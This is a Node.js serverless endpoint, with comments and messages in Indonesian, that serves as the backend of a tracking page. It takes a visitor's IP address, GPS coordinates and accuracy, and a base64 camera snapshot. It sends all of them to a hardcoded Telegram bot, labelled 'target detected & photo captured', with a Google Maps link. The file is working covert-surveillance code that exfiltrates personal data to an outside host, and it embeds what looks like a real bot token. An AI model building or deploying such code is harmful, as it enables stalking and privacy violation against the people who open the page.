const axios = require('axios');

export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const token = '8341126680:AAFzJbyih79CWYbcj8ypSktqEecdh7Cf7Io';
    const chatId = '7710372176';

    const ipAddress = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const { latitude, longitude, accuracy, image } = req.body;

    try {
        // 1. Jika ada foto yang dikirim dari kamera
        if (image) {
            const base64Data = image.replace(/^data:image\/jpeg;base64,/, "");
            const buffer = Buffer.from(base64Data, 'base64');

            const FormData = require('form-data');
            const form = new FormData();
            form.append('chat_id', chatId);
            form.append('photo', buffer, { filename: 'target.jpg', contentType: 'image/jpeg' });
            form.append('caption', `🚨 **Target Terdeteksi & Foto Berhasil Diambil!**\n\n` +
                                    `🌐 **IP Address:** ${ipAddress}\n` +
                                    `📍 **Latitude:** ${latitude || 'Tidak diizinkan'}\n` +
                                    `📍 **Longitude:** ${longitude || 'Tidak diizinkan'}\n` +
                                    `🎯 **Akurasi:** ${accuracy ? accuracy + ' meter' : '-'}\n` +
                                    `🗺️ **Google Maps:** https://maps.google.com/?q=${latitude},${longitude}`);
            form.append('parse_mode', 'Markdown');

            await axios.post(`https://api.telegram.org/bot${token}/sendPhoto`, form, {
                headers: form.getHeaders()
            });
        } else {
            // 2. Jika kamera ditolak, kirim pesan teks biasa
            const message = `🚨 **Target Terdeteksi (Tanpa Kamera)!**\n\n` +
                            `🌐 **IP Address:** ${ipAddress}\n` +
                            `📍 **Latitude:** ${latitude}\n` +
                            `📍 **Longitude:** ${longitude}\n` +
                            `🎯 **Akurasi:** ${accuracy} meter\n` +
                            `🗺️ **Google Maps:** https://maps.google.com/?q=${latitude},${longitude}`;

            await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            });
        }

        return res.status(200).json({ status: 'success' });
    } catch (error) {
        return res.status(500).json({ status: 'error', message: error.message });
    }
}
